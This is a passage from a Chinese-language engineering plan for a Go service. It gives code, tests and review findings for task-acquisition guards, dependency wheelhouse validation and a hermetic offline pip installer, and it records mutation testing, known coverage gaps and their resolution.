		return nil, pkgerrors.New(pkgerrors.CodeConflict,
			fmt.Sprintf("当前已有训练任务正在执行中 (taskId: %s, op: %s)，请等待完成后再提交", task, op))
	}

	// 2. Model and dependency imports both drive the shared audit subsystem, so each must
	// refuse to start while an audit is already in flight. Data import and training stay
	// decoupled from auditing and may proceed concurrently.
	if taskType == "model_import" || taskType == "deps_import" {
		if s.isAuditBusyLocked() {
			auditTask := s.ActiveAuditTaskID
			if auditTask == "" {
				auditTask = "model_audit"
			}
			return nil, pkgerrors.New(pkgerrors.CodeConflict,
				fmt.Sprintf("当前已有模型代码审计正在执行中 (taskId: %s, op: auditing)，请等待完成后再提交", auditTask))
		}
	}

	// 3. Refuse if another task is mid-flight (downloading, decrypting, ...).
	if s.ActiveTaskID != "" || (s.CurrentOp != "" && s.CurrentOp != "idle") {
		isSameTaskPair := false
		if taskID != "" && s.ActiveTaskID == taskID && s.activeTask != nil {
			isSameTaskPair = isModelDataPair(s.activeTask.Type, taskType)
		}

		if !isSameTaskPair {
			task, op := s.activeTaskInfoLocked()
			return nil, pkgerrors.New(pkgerrors.CodeConflict,
				fmt.Sprintf("当前已有任务正在执行中 (taskId: %s, op: %s)，请等待完成后再提交", task, op))
		}
	}

	token := time.Now().UnixNano()
	s.activeToken = token
	s.ActiveTaskID = taskID
	s.ActiveRequestID = requestID
	s.CurrentOp = initialOp

	if initialOp == "staging" || initialOp == "training" {
		taskType = "training"
		s.TrainingRunning = true
	}
```

函数**其余部分保持不变**，只把原来 `s.activeTask = &ActiveTaskSnapshot{...}` 里的
`Type: taskType` 继续使用上面重算过的 `taskType`。

注意：原实现里 `taskType` 的赋值块是

```go
	taskType := "data_import"
	if isModel {
		taskType = "model_import"
	} else if initialOp == "staging" || initialOp == "training" {
		taskType = "training"
		s.TrainingRunning = true
	}
```

这段整体被上面 Step 3 的 `if initialOp == "staging" || initialOp == "training"` 取代，务必删除，
不要两处并存。

**已核实：这个"else-if → 无条件 if"的改写逐字等价，不是回归。** 全部调用点为：

| 调用点 | initialOp | isModel |
| :--- | :--- | :--- |
| `handler_task.go:97`（数据导入） | `"downloading"` | `false` |
| `handler_task.go:257`（模型导入） | `"downloading"` | `true` |
| `taa_state_store_integration_test.go:106` / `:435` | `"downloading"` | `true` |
| `taa_state_store_integration_test.go:313` | `"training"` | `false` |
| `concurrency_test.go:223` | `"staging"` | `false` |
| `concurrency_test.go:152/168/194/313/366` | `"downloading"` | 混合 |

即 **`isModel=true` 从不与 `"staging"`/`"training"` 同时出现**，原 `else if` 因此永远只在
`isModel == false` 时求值——无条件化后行为不变。

同理，Step 3 用 `isModelDataPair(s.activeTask.Type, taskType)` 取代原来的
`currentIsModel != isModel` 也是等价的：原式把 `Type == "training"` 视作"非模型"，从而允许
一个模型导入与在飞训练任务配对；但在飞训练任务必然使 `isTrainingBusyLocked()` 为真（它覆盖
`TrainingRunning` 与 `CurrentOp` 为 `staging`/`training`/`reporting` 三种取值），第 1 步就已
拦截，根本走不到第 3 步。所以在可达状态下 `Type` 只可能是 `model_import` 或 `data_import`，
`isModelDataPair` 与原式同值。

**注释语言（CLAUDE.md 硬要求）：** 分界线是"**这段代码是否在本次被重写**"，不是"这行字是否
曾经存在"。`tryAcquireTaskTyped` 是**新函数**，其内部全部注释用英文——包括从原 `tryAcquireTask`
迁移过来的步骤 1/2/3 标记（上面代码块已给出译文）。而包装函数 `tryAcquireTask` 的**中文文档
注释**（`// tryAcquireTask 尝试原子抢占...`）与 `route.go` 其余既有中文注释一样**原样保留、
不翻译**：它们描述的是未被重写的函数与无关代码，改动属无关 churn。中文错误串同理一律不改写。

（初稿此处只写了"不要顺手改任何既有注释的语言"，与代码块里给出的步骤 1/3 译文自相矛盾；
spec 审查抓到了这一点，措辞已按上述分界线订正。）

- [ ] **Step 4: 运行测试确认通过**

```bash
go test ./internal/controller/ -run 'TestTryAcquireDepsTask|TestDepsImportStillAllowsDataImportPairingRules' -v
go test ./internal/controller/ -run 'TestConcurren|TestStateStore' -v
```

期望：新增测试 PASS，且**既有并发与状态存储测试全部保持 PASS**（这是本任务的关键回归点——
原签名的语义必须逐字保持）。

- [ ] **Step 5: 提交**

```bash
git add internal/controller/route.go internal/controller/concurrency_test.go
git commit -m "refactor(controller): add typed task acquisition for deps imports"
```

---

### Task 3 审查追加（编码后按审查结论补充）

**两条等价性主张经独立重推后成立，但其中一条的理由需要加固。**

- Claim 1（`else if` → 无条件 `if`）：审查者列出全部 12 个 `tryAcquireTask` 调用点，
  确认 `isModel=true` 从不与 `staging`/`training` 共存。成立。
- Claim 2（`isModelDataPair` 取代 `currentIsModel != isModel`）：**原式与新式确实存在语义差异**
  ——原式把 `Type == "training"` 当"非模型"，故 `(在飞 training, 请求 model_import)` 下原式会配对、
  新式会拒绝。仅凭"在飞训练任务会让 `isTrainingBusyLocked()` 为真"这一直觉不足以定论；真正的
  不变式是 **`activeTask.Type == "training"` ⟹ `TrainingRunning == true`**，它在锁内始终成立，
  并由 `sealStateLocked` / `RestoreFromPersistentState` 在同一把锁下原子地落到持久态。审查者逐一
  核对 5 个 `TrainingRunning = false` 的写入点（`ResetActiveTask`、`release`、`handleAsyncPanic`、
  `finishTrainingControl`、`resetRecoveryTaskState`），**每一处都在同一临界区把 `activeTask` 置
  nil**。因此该差异是**不可达代码上的差异，不是可达回归**。反向亦无差异：不存在"新式配对、原式
  不配对"的可达组合。

**Important 覆盖缺口（计划缺口，实现忠实照做）：** 计划原给的
`TestTryAcquireDepsTaskBlocksModelImport` 用的是**不同** taskID，于是在第 3 步的
`s.ActiveTaskID == taskID` 处直接短路，**根本没进入 `isModelDataPair`**——把 `isModelDataPair`
改成"deps 与 model 配对"它照样通过。也就是说本任务的核心性质"**deps 不与任何任务配对**"当时
**零覆盖**。已补 `TestDepsImportPairsWithNothing`（三个**同 taskID** 子用例：deps↔model、
deps↔data、model→deps 反向），并做变异校验（把 `isModelDataPair` 临时改为 `current != requested`
后三个子用例必须全部转红）。原测试只是**名字不副实**，行为本身有效（它证明 deps 会占住全局槽位
并拒绝无关 taskID 的请求），故仅重命名为 `TestDepsTaskHoldsTheSlotAgainstOtherTaskIDs`。

**给 Task 6 的已知隐患（既有 flake，非本次引入）：**
`internal/controller/concurrency_test.go` 的 `TestConcurrency_DataImportAllowedWhileAuditing` 会
间歇性报 `TempDir RemoveAll cleanup: ... directory not empty`，根因是它在异步 import 协程尚未
结束时即返回。Task 5/6 的 handler 与流水线测试会大量经 `runAsyncSafe` 派发异步工作，**极易踩到
同一形态**：测试必须在断言前等待异步完成（或让 handler 提供可等待的完成信号），否则会得到
随机失败的绿色套件。隔离运行与满载运行均通过，故属竞态而非确定性缺陷。

**修复与复审结论（已闭环，Task 3 可结）：**

修复分两次提交——`3959224 test(controller): pin deps pairing exclusion with same-taskID cases`
（重命名 + 新增 `TestDepsImportPairsWithNothing`）、`ff9bfbd docs(deps): tighten depsDirForHash
comment wording`（仅注释措辞，无代码变更）。复审独立重跑，未采信实现者自述：

- **重命名确为纯重命名**：diff 中该函数体内无一 `-` 行，只有函数名一行为改动，其余全是新增。
- **三个子用例确实抵达 `isModelDataPair`**：守卫 1（`isTrainingBusyLocked`）因 `initialOp` 为
  `deps_importing`/`downloading` 恒为 false；守卫 2（`isAuditBusyLocked`）因 `NewTAAState` 初始化
  `CurrentAuditOp: "idle"` 且本路径不触碰审计字段亦恒为 false；三例均用**同 taskID**，故不触发
  `s.ActiveTaskID == taskID` 短路，全部命中 `route.go:660`。测试非空转。
- **变异校验（两项都做了）**：变异 A `return current != requested` ⇒ 三子用例全红；变异 B（更隐蔽）
  `return current != requested && (current == "model_import" || requested == "model_import")`
  ⇒ 2/3 转红（`data_import` 那例子在变异 B 下本就应返回 false，属预期），测试整体 FAIL。
  两项变异均以 `git diff --stat` + `git status --short` 为空证明字节级还原。
- **无回归**：`go test ./internal/controller/ -count=1` ⇒ `ok taa/internal/controller 24.400s`，
  已知 flake 未触发。

---

## Task 4: 依赖包校验与离线安装

**Files:**
- Create: `internal/resource/deps.go`
- Create: `internal/runtime/deps.go`
- Test: `internal/resource/deps_test.go`、`internal/runtime/deps_test.go`

- [ ] **Step 1: 写失败测试（校验）**

创建 `internal/resource/deps_test.go`：

```go
package resource

import (
	"os"
	"path/filepath"
	"testing"
)

func TestValidateWheelhouseRequiresRequirementsAndWheel(t *testing.T) {
	t.Run("valid", func(t *testing.T) {
		dir := t.TempDir()
		writeFile(t, filepath.Join(dir, "requirements.txt"), "torchvision==0.28.0\n")
		writeFile(t, filepath.Join(dir, "torchvision-0.28.0-py3-none-any.whl"), "x")
		if err := ValidateWheelhouse(dir); err != nil {
			t.Fatalf("ValidateWheelhouse: %v", err)
		}
	})

	t.Run("missing requirements", func(t *testing.T) {
		dir := t.TempDir()
		writeFile(t, filepath.Join(dir, "a-1.0-py3-none-any.whl"), "x")
		if err := ValidateWheelhouse(dir); err == nil {
			t.Fatal("expected error when requirements.txt is absent")
		}
	})

	t.Run("missing wheel", func(t *testing.T) {
		dir := t.TempDir()
		writeFile(t, filepath.Join(dir, "requirements.txt"), "torchvision==0.28.0\n")
		if err := ValidateWheelhouse(dir); err == nil {
			t.Fatal("expected error when no .whl is present")
		}
	})

	// The three guard branches below are cheap to cover and are exactly the shape of thing
	// that silently loses its guard later: each one is a single line in the implementation,
	// so nothing else would fail if it were deleted.
	t.Run("blank dir", func(t *testing.T) {
		if err := ValidateWheelhouse("   "); err == nil {
			t.Fatal("expected error for a blank wheelhouse dir")
		}
	})

	t.Run("missing dir", func(t *testing.T) {
		if err := ValidateWheelhouse(filepath.Join(t.TempDir(), "does-not-exist")); err == nil {
			t.Fatal("expected error for a nonexistent wheelhouse dir")
		}
	})

	t.Run("path is a file", func(t *testing.T) {
		path := filepath.Join(t.TempDir(), "not-a-dir")
		writeFile(t, path, "x")
		if err := ValidateWheelhouse(path); err == nil {
			t.Fatal("expected error when the wheelhouse path is a file")
		}
	})
}

func writeFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("write %s: %v", path, err)
	}
}
```

**已核实无冲突：** `grep -rn "func writeFile" internal/resource/` 返回空，且 `internal/resource`
与 `internal/runtime` 的测试文件里目前**都没有**小写顶层辅助函数。所以 `writeFile` 可直接定义。

- [ ] **Step 2: 运行测试确认失败**

```bash
go test ./internal/resource/ -run TestValidateWheelhouse -v
```

期望：编译失败 `ValidateWheelhouse undefined`。

- [ ] **Step 3: 实现校验**

创建 `internal/resource/deps.go`：

```go
package resource

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// ValidateWheelhouse checks the unpacked layout of a dependency archive: it must contain
// requirements.txt and at least one .whl. A missing piece rejects the package outright --
// an offline install cannot complete a partial dependency closure, so failing here beats
// surfacing an ImportError at training time.
//
// The scan is deliberately flat (non-recursive): the platform contract is a flat wheelhouse
// with requirements.txt at the archive root, and pip's --find-links is not recursive either.
func ValidateWheelhouse(dir string) error {
	if strings.TrimSpace(dir) == "" {
		return fmt.Errorf("wheelhouse dir is required")
	}
	info, err := os.Stat(dir)
	if err != nil {
		return fmt.Errorf("stat wheelhouse: %w", err)
	}
	if !info.IsDir() {
		return fmt.Errorf("wheelhouse is not a directory: %s", dir)
	}

	if _, err := os.Stat(filepath.Join(dir, "requirements.txt")); err != nil {
		return fmt.Errorf("依赖包缺少 requirements.txt: %w", err)
	}

	entries, err := os.ReadDir(dir)
	if err != nil {
		return fmt.Errorf("read wheelhouse: %w", err)
	}
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		if strings.EqualFold(filepath.Ext(entry.Name()), ".whl") {
			return nil
		}
	}
	return fmt.Errorf("依赖包内未找到任何 .whl 文件")
}
```

- [ ] **Step 4: 运行校验测试确认通过**

```bash
go test ./internal/resource/ -run TestValidateWheelhouse -v
```

期望：PASS。

- [ ] **Step 5: 写失败测试（安装器）**

创建 `internal/runtime/deps_test.go`：

```go
package runtime

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestInstallWheelhouseFailsOnMissingRequirements(t *testing.T) {
	err := InstallWheelhouse(context.Background(), t.TempDir(), filepath.Join(t.TempDir(), "target"))
	if err == nil {
		t.Fatal("expected error for a wheelhouse without requirements.txt")
	}
}

func TestInstallWheelhouseRejectsEmptyArgs(t *testing.T) {
	if err := InstallWheelhouse(context.Background(), "", "/tmp/x"); err == nil {
		t.Fatal("expected error for empty wheelhouse")
	}
	if err := InstallWheelhouse(context.Background(), "/tmp/x", ""); err == nil {
		t.Fatal("expected error for empty target")
	}
}

// stubPip writes a fake pip3 that runs the given shell body, and points the package-level
// pipBinary at it for the rest of the test. This is what keeps the installer tests hermetic:
// they must not depend on a real pip, on network access, or on the machine's Python.
func stubPip(t *testing.T, body string) {
	t.Helper()
	path := filepath.Join(t.TempDir(), "pip3-stub")
	if err := os.WriteFile(path, []byte("#!/bin/sh\n"+body+"\n"), 0o755); err != nil {
		t.Fatalf("write stub: %v", err)
	}
	original := pipBinary
	pipBinary = path
	t.Cleanup(func() { pipBinary = original })
}

func TestInstallWheelhousePassesOfflineFlags(t *testing.T) {
	argsFile := filepath.Join(t.TempDir(), "args.txt")
	t.Setenv("STUB_ARGS_FILE", argsFile)
	stubPip(t, `printf '%s\n' "$@" > "$STUB_ARGS_FILE"`)

	wh := t.TempDir()
	if err := os.WriteFile(filepath.Join(wh, "requirements.txt"), []byte("wheel\n"), 0o644); err != nil {
		t.Fatalf("write requirements: %v", err)
	}
	target := filepath.Join(t.TempDir(), "target")

	if err := InstallWheelhouse(context.Background(), wh, target); err != nil {
		t.Fatalf("InstallWheelhouse: %v", err)
	}

	recorded, err := os.ReadFile(argsFile)
	if err != nil {
		t.Fatalf("stub did not record args: %v", err)
	}
	args := string(recorded)

	// --no-index is precisely what makes the install zero-network. Drop it and an incomplete
	// closure silently resolves from an index instead of failing fast, which is the one
	// property this whole path exists to guarantee -- so pin every load-bearing flag.
	for _, want := range []string{
		"install", "--no-index", "--find-links", wh, "--target", target,
		"-r", filepath.Join(wh, "requirements.txt"),
	} {
		if !strings.Contains(args, want) {
			t.Fatalf("pip args missing %q; got:\n%s", want, args)
		}
	}
}

func TestInstallWheelhouseSurfacesPipFailureTail(t *testing.T) {
	stubPip(t, "echo \"ERROR: No matching distribution found for torch\" >&2\nexit 1")

	wh := t.TempDir()
	if err := os.WriteFile(filepath.Join(wh, "requirements.txt"), []byte("torch\n"), 0o644); err != nil {
		t.Fatalf("write requirements: %v", err)
	}

	err := InstallWheelhouse(context.Background(), wh, filepath.Join(t.TempDir(), "target"))
	if err == nil {
		t.Fatal("expected error when pip exits non-zero")
	}
	// pip explains itself on its last lines; tailLines exists to carry exactly that through,
	// because the operator only ever sees this error string.
	if !strings.Contains(err.Error(), "No matching distribution found for torch") {
		t.Fatalf("error does not carry pip's reason: %v", err)
	}
}
```

**为什么不用"真实 pip + 真实下载"的端到端测试：** 那种测试在离线环境只能 `t.Skipf` 跳过，
而离线恰恰是常态——于是它对"离线安装真能工作"提供**零覆盖**，却让人以为覆盖了。本项目已经
吃过这个亏（见 `.claude/specs/2026-10-08-llm-timeout-layering-design.md` §7.4 第 5 条：验证
脚本静默丢弃样本，使"全部 200"在残缺列表上通过）。桩测试恒可运行，并额外钉死了 `--no-index`
这类"丢了也不报错、但会让整个 fail-closed 语义失效"的参数。

**桩方案的执行前提已核实：** 桩脚本落在 `t.TempDir()`（即 `$TMPDIR`，本机为 `/tmp`）下，
需要该挂载点可执行。实测本机 `/tmp` 无独立挂载、继承根分区选项，`chmod 755` 后可直接执行；
若将来 CI 把 `/tmp` 挂成 `noexec`，这三个测试会以"permission denied"明确失败（不会静默跳过），
届时把 `TMPDIR` 指向可执行目录即可。

- [ ] **Step 6: 运行测试确认失败**

```bash
go test ./internal/runtime/ -run TestInstallWheelhouse -v
```

期望：编译失败 `InstallWheelhouse undefined`。

- [ ] **Step 7: 实现安装器**

创建 `internal/runtime/deps.go`：

```go
package runtime

import (
	"bytes"
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// pipBinary is a package-level variable so tests can point it at a stub. The installer tests
// stay hermetic through it: they must not need a real pip or a network.
var pipBinary = "pip3"

// InstallWheelhouse installs an offline wheelhouse into target as a non-root, zero-network
// operation.
//
// --target is used rather than unpacking the wheels by hand because the .dist-info metadata
// has to be correct (the torch ecosystem queries importlib.metadata at runtime) and the wheel
// *.data/ layout has to be placed per spec. --no-index makes the install zero-network: an
// incomplete closure fails here instead of surfacing as an ImportError mid-training.
//
// On failure target may be left partially populated. Cleanup belongs to the caller -- the
// import pipeline removes depsDir/<hash> wholesale so no half-installed set survives.
func InstallWheelhouse(ctx context.Context, wheelhouse, target string) error {
	if strings.TrimSpace(wheelhouse) == "" {
		return fmt.Errorf("wheelhouse dir is required")
	}
	if strings.TrimSpace(target) == "" {
		return fmt.Errorf("target dir is required")
	}
	requirements := filepath.Join(wheelhouse, "requirements.txt")
	if _, err := os.Stat(requirements); err != nil {
		return fmt.Errorf("requirements.txt not found in wheelhouse: %w", err)
	}
	if err := os.MkdirAll(target, 0o755); err != nil {
		return fmt.Errorf("create target dir: %w", err)
	}
	if ctx == nil {
		ctx = context.Background()
	}

	args := []string{
		"install",
		"--no-index",
		"--no-cache-dir",
		"--disable-pip-version-check",
		"--find-links", wheelhouse,
		"--target", target,
		"-r", requirements,
	}

	cmd := exec.CommandContext(ctx, pipBinary, args...)
	cmd.Env = append(os.Environ(),
		"PIP_NO_INDEX=1",
		"PIP_DISABLE_PIP_VERSION_CHECK=1",
	)
	var output bytes.Buffer
	cmd.Stdout = &output
	cmd.Stderr = &output

	if err := cmd.Run(); err != nil {
		return fmt.Errorf("pip install failed: %w: %s", err, tailLines(output.String(), 40))
	}
	return nil
}

// tailLines keeps only the last few lines of command output: pip states its reason at the
// end, while a long successful run can produce far more than is worth carrying into an error.
func tailLines(s string, max int) string {
	lines := strings.Split(strings.TrimRight(s, "\n"), "\n")
	if len(lines) > max {
		lines = lines[len(lines)-max:]
	}
	return strings.Join(lines, "\n")
}
```

- [ ] **Step 8: 运行测试确认通过**

```bash
go test ./internal/runtime/ -run TestInstallWheelhouse -v
```

期望：**全部 PASS，且没有任何 SKIP。** 若出现 SKIP，说明有人把测试改回了依赖真实 pip 或网络的
形态——那正是本节要避免的失败模式（离线环境必然跳过 ⇒ 对"离线安装真能工作"零覆盖，却看起来
是绿的）。

**注释语言（CLAUDE.md 硬要求）：** 本任务新增/改写的**注释**一律英文（上面代码块已改好）。
但**用户可见的错误字符串保持中文**——`依赖包缺少 requirements.txt`、`依赖包内未找到任何 .whl
文件` 这类报错会经 `reportDeps` 原样回给平台运维，与本仓库既有惯例一致
（`internal/resource/downloader.go:38`「创建临时文件失败」、`archive.go:230`「解压累计字节超过
上限」均为中文），而包裹技术错误的英文形式（`archive.go:43` "target destination dir is
required"）同样保留。**不要翻译任何既有字符串，也不要为了统一而改动无关文件。**

- [ ] **Step 9: 提交**

```bash
git add internal/resource/deps.go internal/resource/deps_test.go internal/runtime/deps.go internal/runtime/deps_test.go
git commit -m "feat(deps): add wheelhouse validation and offline pip install"
```

---

### Task 4 spec 审查追加（编码后按审查结论补充）

**结论：✅ 合规**（提交 `2ced5ed`）。最硬的证据：审查者把本 Task 的四个代码块按行号抽出，与仓库
文件做 `diff -u`，**四个文件 0 行差异**——实现与 spec 逐字一致。无 Critical / Important，无 Missing，
无 Extra（`git show --name-only` 仅四个文件；全仓 grep `ValidateWheelhouse|InstallWheelhouse|
pipBinary|tailLines` 在这四个文件之外零命中，确认"未接线"符合本 Task 的定位）。

变异校验（审查者独立执行，每次以 `git diff --stat` 为空证明字节级还原）：

- 从参数向量中删掉 `--no-index` ⇒ `TestInstallWheelhousePassesOfflineFlags` FAIL，离线保证被真正钉住。
- 失败时返回 `fmt.Errorf("...: %w", err)`（包住但丢失尾输出）**以及**裸 `return err` ⇒ 两种写法都被
  `TestInstallWheelhouseSurfacesPipFailureTail` 捕获，失败信息正是"只剩 exit status 1"。
- 让 `*.whl` 扫描直接 `return nil` ⇒ `missing_wheel` 子用例 FAIL。

密闭性是**经验性证明**而非读代码推断：把 `pipBinary` 临时指向"被调用就 touch 标记文件"的脚本，运行
两个不依赖 stub 的用例后标记文件**不存在** ⇒ 它们从不 exec 外部进程，自然不触网。`-v` 全量输出中
SKIP + FAIL 计数为 0。

**已知 4 条 Minor，属同一缺陷类：守卫存在但无判别力。** 审查者明确标注这是 spec 自带测试的设计属性，
不是实现偏离：

| # | 位置 | 现象 |
| :--- | :--- | :--- |
| 1 | `internal/runtime/deps_test.go:18-25` | 删掉 `internal/runtime/deps.go:28-33` 的空参守卫，测试仍 PASS（下游 `requirements.txt` 的 `Stat` 兜底报错） |
| 2 | `internal/resource/deps_test.go:38-42`（`blank_dir`） | 删掉 `internal/resource/deps.go:18-20` 的空白守卫仍 PASS（`os.Stat("   ")` 兜底） |
| 3 | `internal/resource/deps_test.go:50-56`（`path_is_a_file`） | 删掉 `internal/resource/deps.go:25-27` 的 `!info.IsDir()` 仍 PASS |
| 4 | `internal/runtime/deps.go:48-49` | `--no-cache-dir`、`--disable-pip-version-check` 两个参数无任何测试钉住 |

这三条与 Task 3 修掉的"空转测试"同型：测试断言了**行为**，却没钉住**那一行守卫**。处理方式：与
代码质量审查的发现**合并为一次修复派发**，不单独返工。

**给 Task 6 的提醒：** 在上述修复落地前，若有人误删这些守卫，CI 不会报警。接线时如发现守卫位置
变动，请一并确认对应测试是否仍有判别力。

### Task 4 代码质量审查追加

**总评：可交付，无 Critical。** 审查者在 `/tmp` 下用**字节级副本 + 真实 pip 24.0** 做了实测，
仓库文件一字节未动（`git status --porcelain -- internal/` 为空）。1 条 Important + 5 条 Minor。

**Important：取消语义。** `internal/runtime/deps.go` 的 `cmd.Run()` 错误处理有两个独立问题：

1. 中途取消**无法与真实失败区分**——`errors.Is(err, context.Canceled)` 为 **false**，因为 `%w`
   包裹的是 `*exec.ExitError`（"signal: killed"）而非 `ctx.Err()`。一次主动取消（停机/任务取消）
   会被当成真实的依赖安装失败上报给平台。
2. 取消延迟**不受 `ctx` 约束**——`cmd.Stdout` 为 `bytes.Buffer` 时 Go 起 goroutine 拷贝管道，
   `Wait` 必须等到管道 EOF；`exec.CommandContext` 只杀直接子进程，任何继承该管道的孙进程都会
   让 `Wait` 一直挂住。实测：单进程 0.3s vs `sh -c 'sleep 30'` **30.0s**。

修法：`cmd.WaitDelay = 30 * time.Second`（`go.mod` 为 1.22）+ 返回前先查 `ctx.Err()`。仓库内已有
先例：`internal/codeaudit/semgrep_engine.go:558-560`。

> **给 Task 6 的说明**：Task 6 的 `depsInstallFunc` 绑的是
> `runtime.InstallWheelhouse(context.Background(), ...)`，因此**取消路径当前不可达**，上述问题
> 是导出 API 的契约缺陷而非现实故障。修复后错误变得可辨识；将来若接入取消，务必传入可取消的
> `ctx`，否则新加的判定分支永远不生效。

**新发现的 Minor（比已知 4 条更典型）：** `tailLines` 的截断**完全没有测试**——把调用换成裸
`output.String()`（彻底废掉截断），现有全部测试仍然通过。另有 `limit` 参数名遮蔽 Go 1.21 内置
`max`（合法但别扭）、`limit <= 0` 时 `lines[len-limit:]` 会 panic（当前调用点传常量 40，不可达）、
以及截断时无任何标记（运维无法区分"pip 只输出了 40 行"与"被砍到 40 行"）。

**已知 4 条 Minor：审查者逐条独立复现，全部同意并有最小修法**（详见上表）；第 4 条被评为"最不值钱"，
建议只补真正独立的那条防线（`PIP_NO_INDEX=1`）而非为冗余参数写测试。

**经核实、确认不是问题的行为（供 Task 6 参考，不必再查）**：带尾斜杠的 `wheelhouse`、符号链接目录、
已有的非空 `target`（pip 会合并，但 target 是内容寻址的 `depsDir/<sm3>`，同 hash ⇒ 同归档 ⇒
合并收敛且无害）、相对路径 `wheelhouse`（子进程未设 `cmd.Dir`，继承父进程 cwd，与先前的 `os.Stat`
解析一致）、以及用 `fmt.Errorf` 而非本包邻居的 `pkgerrors`（调用方走 `err.Error()`，不消费错误码）。

**处理方式：** 以上 Important 与全部 Minor **合并为一次修复派发**，不逐条返工。

### Task 4 修复落地记录与第二次派发（`df9b8aa`）

六项全部落地，13 次针对性变异全部被测试捕获，变异前后四文件 sha256 逐字节还原（提交后
`git status --short` 中这四文件全为 clean）。门禁：`go test ./internal/resource/ ./internal/runtime/
-count=1` PASS（61 用例，SKIP=0，FAIL=0），`-race -count=5` 通过，`gofmt -l` 无输出，`go vet` clean。
提交只含四个文件，message 单行、无正文、无署名。

**审查指令被实现者纠正一处（是我的错，不是它的）：** 我要求用 `"not a directory"` 去钉
`!info.IsDir()` 守卫，实测该片段**没有判别力**——守卫删掉后下游 `os.Stat("<file>/requirements.txt")`
以 ENOTDIR 失败，Linux 上该错误的文本恰是 `not a directory`，断言照样通过。实现者实测拿到
`DECOY-MATCH contains "not a directory": true` / `GUARD-MATCH contains "wheelhouse is not a
directory": false` 后才改用守卫自身的消息。
**教训：钉用户可见错误时，断言必须用该守卫独有的措辞**，不能用可能与下游错误文本撞车的通用措辞。
后续 Task 8/9/10 中若要给守卫写断言，一律照此办理。

**未覆盖行为（如实登记，不掩盖）：** `cmd.WaitDelay` 本身**没有被行为钉住**——换成
`_ = time.Second`（保留 `time` 被使用以便编译）后 `TestInstallWheelhouseReportsCancellation`
仍然 PASS。原因是该用例的桩是 `exec sleep 30`：`exec` 让 sleep 顶替了 shell，杀掉直接子进程即
关闭管道，`WaitDelay` 根本不被触发。

#### 第二次派发：把 `WaitDelay` 钉住

理由：`WaitDelay` 是本次为"孙进程持有管道 ⇒ `Wait` 无界挂起"专门新增的防线。在 TEE 内，一次
挂起表现为**停机卡死**而不是失败——属于必须可观测的行为。"加了防线但测试观测不到"正是本项目
两次审查都在拒的东西，因此不接受只登记不处理。

做法（`internal/runtime/deps.go` + `deps_test.go`）：

1. 把常量提成包级可注入变量，与既有的 `pipBinary` 同款：`var pipWaitDelay = 30 * time.Second`，
   并在 `pipBinary` 那段"测试不得用 `t.Parallel`"的注释里把 `pipWaitDelay` 一并列上
   （现在包级可变量有两个，注释要覆盖到）。
2. 桩改为**直接子进程立即退出、但留下一个继承 stdout/stderr 管道的孙进程**：

   ```sh
   #!/bin/sh
   sleep 8 &
   exit 1
   ```

   非交互 `sh` 不会等待后台作业，因此 `sh` 立刻退出而 `sleep 8` 继续持有管道写端。
3. 用例把 `pipWaitDelay` 临时压到 `300 * time.Millisecond`（用例结束还原），断言
   `cmd.Run()` **在 5s 内返回且 err != nil**。断言必须用**时长上界**，不能断言
   `errors.Is(err, exec.ErrWaitDelay)`——Go 在该进程已以非零码退出时返回的是 `*ExitError`，
   不是 `ErrWaitDelay`，按哨兵错误断言会假失败。
4. **验收要求：必须给出双向实测证据**——钉住时实测耗时，以及把 `cmd.WaitDelay = pipWaitDelay`
   改成 `_ = pipWaitDelay` 后的实测耗时（预期约 8s，被 5s 上界判 FAIL）。只报"测试通过"不算完成。

`git add` 仅限 `internal/runtime/deps.go`、`internal/runtime/deps_test.go` 两个文件。

#### Task 4 复审结论（已闭环，Task 4 可结）

**复审：APPROVE。** 7 项全部修复正确、无回归。复审在 `/tmp` 副本上做变异，仓库一字节未动
（`git status --porcelain -- internal/` 为空）。门禁：`go test ./internal/resource/ ./internal/runtime/
-count=1 -v` PASS（0 FAIL / 0 SKIP）、`-race -count=5` 通过、`go vet` clean、
`go build ./cmd/... ./internal/... ./pkg/...` clean。

**复审独立复现并确认了我的断言指令是错的**（详见上文）：删掉 `!info.IsDir()` 守卫后
`ValidateWheelhouse(<普通文件>)` 返回 `依赖包缺少 requirements.txt: stat <file>/requirements.txt:
not a directory`，故 `Contains(err, "not a directory")` 为 **true**（变异体照样通过、无判别力），
而 `Contains(err, "wheelhouse is not a directory")` 为 **false**（有判别力）。实现者的偏离是对的。

**三条 Minor，均判断为"登记不修"，理由如下（是判断，不是遗漏）：**

| # | 内容 | 处理与理由 |
| :--- | :--- | :--- |
| 1 | `deps.go` 注释称 WaitDelay 到期后 Wait "returns with ErrWaitDelay"，与同处测试注释及 Go 语义矛盾——`ErrWaitDelay` 仅在子进程**以 0 退出**时代入（`$GOROOT/src/os/exec/exec.go`：`if goroutineErr := c.awaitGoroutines(timer); err == nil { err = goroutineErr }`） | **已修**（注释行）。理由：这条注释会引导后人写出 `errors.Is(err, exec.ErrWaitDelay)`，正是测试注释明确警告的那个假失败 |
| 2 | 新测试每次运行遗留一个孤儿 `sleep 8` 进程 | **不修。** 复审建议改 `sleep 2`，但那会**摧毁判别力**：变异后耗时 2s 落在 5s 上界之内，测试反而转 PASS。当前"失败侧 8s vs 5s = 1.6×"是必需的；孤儿进程空闲，约 8s 后自然退出 |
| 3 | `Contains(recordedEnv, "PIP_NO_INDEX=1")` 在已导出该变量的宿主机上会**真空通过** | **不修，但已把根因写进代码注释。** 根因是 `append(os.Environ(), ...)` 的重复键：libc `getenv` 取**首个**匹配、Go `syscall.Getenv` 取**最后一个**，两者会看到不同的值。**该隐患不是活的缺陷**——`--no-index`（`deps.go:63`）与 `--disable-pip-version-check`（`:65`）都是命令行 flag，而 pip 的优先级是**命令行 > 环境变量**，故那两条环境变量只是冗余保险。已加注释，禁止后人把它们变成承重构件 |

**顺带核实（不要顺手改）**：`gofmt -l internal/resource` 会报出 `archive.go` 与 `envelope.go`，
二者**本次未被触碰**（由无关提交 `3cb9b27` 引入），不在本计划范围内。

---

## Task 5: `importDeps` handler 与路由

**Files:**
- Create: `internal/controller/deps_import.go`（本任务只放请求体与 handler）
- Modify: `internal/controller/router.go:9-22`
- Test: `internal/controller/deps_import_test.go`（**新建**；Task 6/8/10 再往这个文件追加）

